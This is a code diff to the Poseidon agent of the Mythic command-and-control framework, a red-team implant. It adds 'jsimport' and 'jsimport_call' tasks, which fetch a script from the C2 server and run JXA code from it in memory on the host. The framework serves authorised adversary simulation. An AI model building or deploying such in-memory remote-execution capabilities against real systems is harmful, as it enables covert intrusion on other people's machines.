@@ -47,6 +47,8 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/unsetenv"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/upload"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/xpc"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/jsimport"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/jsimport_call"
 )
 
 const (
@@ -200,11 +202,15 @@ func main() {
 		"listtasks":         37,
 		"list_entitlements": 38,
 		"execute_memory":    39,
+		"jsimport":          40,
+		"jsimport_call":     41,
 		"none":              NONE_CODE,
 	}
 
 	// Map used to handle go routines that are waiting for a response from apfell to continue
 	backgroundTasks := make(map[string](chan []byte))
+	// Store a string version of a shared script that can be imported via jsimport and called via jsimport_call
+	var imported_script string
 	//if we have an Active apfell session, enter the tasking loop
 	if strings.Contains(checkIn.Status, "success") {
 		var fromMythicSocksChannel = make(chan structs.SocksMsg, 100) // our channel for Socks
@@ -223,7 +229,6 @@ func main() {
 				Unfortunately, due to the architecture of goroutines, there is no easy way to kill threads.
 				This check is to make sure we're running a "killable" process, and if so, add it to the queue.
 				The supported processes are:
-					- executeassembly
 					- triagedirectory
 					- portscan
 			*/
@@ -594,13 +599,24 @@ func main() {
 					go list_entitlements.Run(task.Tasks[j])
 					break
 				case 39:
-					// File upload
+					// File upload for execute_memory
 					var jsonArgs map[string]interface{}
 					json.Unmarshal([]byte(task.Tasks[j].Params), &jsonArgs)
 					backgroundTasks[jsonArgs["file_id"].(string)] = make(chan []byte)
 					go execute_memory.Run(task.Tasks[j], backgroundTasks[jsonArgs["file_id"].(string)], profile.GetFile)
 					//log.Println("Added to backgroundTasks with file id: ", fileDetails.FileID)
 					//go profile.GetFile(task.Tasks[j], fileDetails, backgroundTasks[fileDetails.FileID])
+					break
+                case 40:
+					// File upload for jsimport
+					var jsonArgs map[string]interface{}
+					json.Unmarshal([]byte(task.Tasks[j].Params), &jsonArgs)
+					backgroundTasks[jsonArgs["file_id"].(string)] = make(chan []byte)
+					go jsimport.Run(task.Tasks[j], backgroundTasks[jsonArgs["file_id"].(string)], profile.GetFile, &imported_script)
+					break
+                case 41:
+					//Execute jxa code in memory from the script imported by jsimport
+					go jsimport_call.Run(task.Tasks[j], imported_script)
 					break
 				case NONE_CODE:
 					// No tasks, do nothing
